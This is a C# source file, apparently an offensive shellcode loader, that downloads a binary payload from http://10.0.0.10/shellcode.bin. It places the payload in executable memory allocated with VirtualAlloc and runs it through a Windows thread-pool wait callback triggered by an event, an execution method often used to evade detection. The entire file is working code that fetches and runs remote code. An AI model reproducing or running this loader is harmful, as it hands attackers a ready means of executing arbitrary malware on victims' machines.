using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CreateThreadPoolWait
{
    class Program
    {
        const int LEN = 277;



        static void Main()
        {
            string url = "http://10.0.0.10/shellcode.bin";
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            IntPtr hEvent = CreateEvent(IntPtr.Zero, false, false, null);
            if (hEvent == IntPtr.Zero)
            {
                throw new Exception("Failed to create event. Error: " + Marshal.GetLastWin32Error());
            }

            IntPtr addr = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x1000, 0x40);
            if (addr == IntPtr.Zero)
            {
                throw new Exception("Failed to allocate memory. Error: " + Marshal.GetLastWin32Error());
            }

            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            IntPtr ptp_w = CreateThreadpoolWait(addr, IntPtr.Zero, IntPtr.Zero);
            if (ptp_w == IntPtr.Zero)
            {
                throw new Exception("Failed to create thread pool wait object. Error: " + Marshal.GetLastWin32Error());
            }

            SetThreadpoolWait(ptp_w, hEvent, IntPtr.Zero);

            // Need to send events so the Threadpool Wait Callback has a chance to "catch" them and run.
            if (!SetEvent(hEvent))
            {
                throw new Exception("Failed to set event. Error: " + Marshal.GetLastWin32Error());
            }

            WaitForThreadpoolWaitCallbacks(ptp_w, false);

            if (!SetEvent(hEvent))
            {
                throw new Exception("Failed to set event. Error: " + Marshal.GetLastWin32Error());
            }

        }

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateEvent(IntPtr lpEventAttributes, bool bManualReset, bool bInitialState, string lpName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateThreadpoolWait(IntPtr addr, IntPtr pv, IntPtr pc);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern void SetThreadpoolWait(IntPtr pwa, IntPtr h, IntPtr pftTimeout);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern void WaitForThreadpoolWaitCallbacks(IntPtr pwa, bool fCancelPendingCallbacks);

        [DllImport("kernel32.dll")]
        static extern bool SetEvent(IntPtr hEvent);
    }
}
